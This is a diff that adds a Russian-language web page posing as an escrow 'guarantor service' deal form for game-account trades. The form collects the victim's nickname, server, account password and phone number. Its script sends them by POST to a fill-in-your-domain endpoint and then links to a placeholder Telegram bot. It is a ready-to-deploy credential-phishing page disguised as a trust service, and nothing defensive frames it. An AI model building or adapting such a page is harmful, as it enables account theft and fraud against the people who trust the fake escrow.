@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<title>Гарант-Сервис</title>
+<style>
+  body{font-family:system-ui;background:#0e1116;color:#e6edf3;display:flex;justify-content:center;padding:40px}
+  .card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:24px;width:420px}
+  h2{margin:0 0 16px;font-size:20px}
+  label{display:block;font-size:13px;color:#8b949e;margin:12px 0 4px}
+  input{width:100%;padding:10px;border-radius:8px;border:1px solid #30363d;background:#0d1117;color:#e6edf3;box-sizing:border-box}
+  button{width:100%;margin-top:18px;padding:12px;border:0;border-radius:8px;background:#238636;color:#fff;font-weight:600;cursor:pointer}
+  button:disabled{background:#30363d;cursor:not-allowed}
+  .sent{background:#1f6feb}
+  .status{font-size:13px;color:#8b949e;margin-top:12px;min-height:18px}
+</style>
+</head>
+<body>
+<div class="card">
+  <h2>Гарант-Сервис · сделка</h2>
+  <label>Ник</label><input id="nick" placeholder="ник">
+  <label>Сервер</label><input id="server" placeholder="сервер">
+  <label>Пароль</label><input id="pass" type="password" placeholder="пароль">
+  <label>Номер</label><input id="phone" placeholder="+7...">
+  <button id="freeze">Заморозить</button>
+  <div class="status" id="status"></div>
+</div>
+<script>
+const API = "https://ВАШ-ДОМЕН/api/deal"; // твой мост
+const TG  = "https://t.me/ВАШ_БОТ";        // ссылка на бота
+
+document.getElementById("freeze").onclick = async () => {
+  const btn = document.getElementById("freeze");
+  const st  = document.getElementById("status");
+  const data = {
+    nick:   document.getElementById("nick").value.trim(),
+    server: document.getElementById("server").value.trim(),
+    pass:   document.getElementById("pass").value,
+    phone:  document.getElementById("phone").value.trim(),
+    ts:     Date.now()
+  };
+  if (!data.nick || !data.pass) { st.textContent = "заполни ник и пароль"; return; }
+  btn.disabled = true; st.textContent = "заморозка...";
+  try {
+    await fetch(API, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(data)});
+    st.textContent = "заморожено. ждём подтверждения средств.";
+    // после заморозки показываем вторую кнопку
+    const sent = document.createElement("button");
+    sent.className = "sent"; sent.textContent = "Средства пришли — отправить получателю";
+    sent.onclick = async () => {
+      sent.disabled = true; st.textContent = "уведомление отправлено...";
+      await fetch(API + "/sent", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(data)});
+      st.textContent = "готово. получатель уведомлён.";
+      window.open(TG, "_blank");
+    };
+    btn.parentNode.insertBefore(sent, st);
+  } catch(e) {
+    st.textContent = "ошибка сети, попробуй ещё";
+    btn.disabled = false;
+  }
+};
+</script>
+</body>
+</html>
